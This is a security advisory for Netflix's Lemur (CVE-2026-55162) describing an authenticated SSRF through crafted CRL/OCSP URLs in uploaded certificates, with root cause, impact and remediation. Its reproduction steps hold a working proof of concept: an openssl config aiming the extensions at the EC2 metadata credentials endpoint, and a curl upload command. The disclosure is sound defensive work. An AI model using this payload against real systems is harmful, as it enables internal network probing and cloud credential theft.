# [M] Lemur: Crafted CRL/OCSP URLs in uploaded certificates lead to post-authentication SSRF

## Summary
Severity: Medium
Advisory: GHSA-54vg-pfh7-jq95
CVE: CVE-2026-55162
CWE: CWE-918
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:L (CVSS_V3)
Published: 2026-06-25
Source: https://github.com/advisories/GHSA-54vg-pfh7-jq95
Type: github-advisory

## Affected
- PyPI: `lemur` — affected >=0 <1.9.2

## Details
## Summary
 
When verifying an uploaded certificate, `lemur/certificates/verify.py` extracts the CRL Distribution Point URL and the OCSP responder URL directly from the certificate's extensions and issues outbound requests to those URLs without scheme restriction or destination allow-listing. An authenticated user holding the operator role (required by `StrictRolePermission` on `POST /certificates/upload`) can craft a certificate whose extensions point at internal services - instance metadata endpoints, internal Kubernetes API servers, RFC1918 hosts, link-local addresses - and cause the Lemur host to issue requests against those destinations during verification.
 
## Root Cause
 
`lemur/certificates/verify.py`, `crl_verify`:
 
```python
point = p.full_name[0].value                          # URL from CDP extension of uploaded cert
...
response = requests.get(point, timeout=(3.05, 6))     # no allow-list, no destination filter
```
 
`lemur/certificates/verify.py`, `ocsp_verify`:
 
```python
command = ["openssl", "x509", "-noout", "-ocsp_uri", "-in", cert_path]
p1 = subprocess.Popen(command, stdout=subprocess.PIPE, ...)
url, _ = p1.communicate()
p2 = subprocess.Popen(
    ["openssl", "ocsp", "-issuer", issuer_chain_path, "-cert", cert_path,
     "-url", url.strip()],                            # attacker-controlled URL
    ...
)
```
 
In both code paths the URL flows from attacker-controlled certificate-extension content to a network sink with no validation against an allow-list of hostnames, no scheme restriction beyond rejecting LDAP via `InvalidSchema`, and no filtering of RFC1918 / link-local (169.254/16) / loopback / IPv6 ULA destinations.
 
## Affected Endpoints
 
| Method | Path | Source |
|---|---|---|
| POST | /api/1/certificates/upload | `verify_string` → `crl_verify` / `ocsp_verify` |
 
The bug additionally surfaces anywhere `verify_string` is invoked on attacker-influenced certificate content (sync paths, source plugin re-validation, etc.). The upload endpoint is the most direct trigger.
 
## Impact
 
An operator-role attacker can:
 
- Probe the Lemur host's internal network through outbound CRL/OCSP fetches and infer topology from response timings and error messages.
- On EC2 instances without IMDSv2 enforcement, cause requests to `http://169.254.169.254/` and influence downstream behavior of components that parse the response.
- Pin attacker-controlled CRLs into the unbounded module-level `crl_cache` dict (see Advisory 4c) for permanent cache poisoning - once cached, a poisoned CRL is served to every subsequent verification for the same URL.
The operator-role precondition reduces severity from what an unauthenticated SSRF would warrant, but operators are still meaningfully less trusted than the host's network position. PKI workflows also routinely process third-party certificates whose extensions are not directly controlled by the operator, broadening the trigger surface beyond purely-malicious operators.
 
## Remediation
 
Filter the URL before it reaches the network sink. Either:
 
1. Maintain an explicit allow-list of CRL/OCSP hostnames in configuration (e.g., `LEMUR_TRUSTED_CRL_HOSTS` and `LEMUR_TRUSTED_OCSP_HOSTS`) and reject anything outside the list, **or**
2. Use an SSRF-safe HTTP client wrapper that resolves the destination, rejects RFC1918 / link-local / loopback / IPv6 ULA addresses before connecting, and pins the resolved IP to defeat DNS rebinding.
For OCSP, route the parsed URL through the same wrapper before passing it as `-url` to `openssl ocsp`.
 
Additionally, bound `crl_cache` (see Advisory 4c) to prevent the SSRF vector from amplifying into a persistent cache-poisoning condition.
 
## Steps to Reproduce
 
1. Set up Lemur on an EC2 instance with IMDSv1 enabled (or any host with reachable RFC1918 services). Create an admin user and an operator-role user `eve`.
2. Generate a self-signed certificate whose extensions point at internal services:
   ```
   cat > openssl.cnf <<EOF
   [req]
   distinguished_name = req_distinguished_name
   req_extensions = v3_ca
   prompt = no
 
   [req_distinguished_name]
   CN = ssrf-poc.example
 
   [v3_ca]
   crlDistributionPoints = URI:http://169.254.169.254/latest/meta-data/iam/security-credentials/
   authorityInfoAccess = OCSP;URI:http://169.254.169.254/latest/meta-data/
   EOF
 
   openssl req -x509 -newkey rsa:2048 -keyout ssrf.key -out ssrf.crt \
       -days 365 -nodes -config openssl.cnf -extensions v3_ca
   ```
 
3. On the Lemur host, start a packet capture filter for the target address before submitting the cert:
   ```
   sudo tcpdump -nni any host 169.254.169.254
   ```
 
4. As `eve`, upload the malicious certificate:
   ```
   BODY=$(cat ssrf.crt | sed ':a;N;$!ba;s/\n/\\n/g')
   curl -X POST https://lemur.local/api/1/certificates/upload \
        -H "Authorization: Bearer <eve_jwt>" \
        -H "Content-Type: application/json" \
        -d "{
              \"name\": \"ssrf-poc\",
              \"body\": \"$BODY\",
              \"chain\": \"\",
              \"private_key\": \"\",
              \"owner\": \"eve@example.com\"
            }"
   ```
 
5. Observe the outbound request to `169.254.169.254` in the tcpdump output. The request originates from the Lemur process during `verify_string` processing of the uploaded cert. The attacker has successfully induced a server-side request to an internal address of their choosing.

## References
- https://github.com/Netflix/lemur/security/advisories/GHSA-54vg-pfh7-jq95
- https://github.com/Netflix/lemur
- https://github.com/Netflix/lemur/releases/tag/v1.9.2
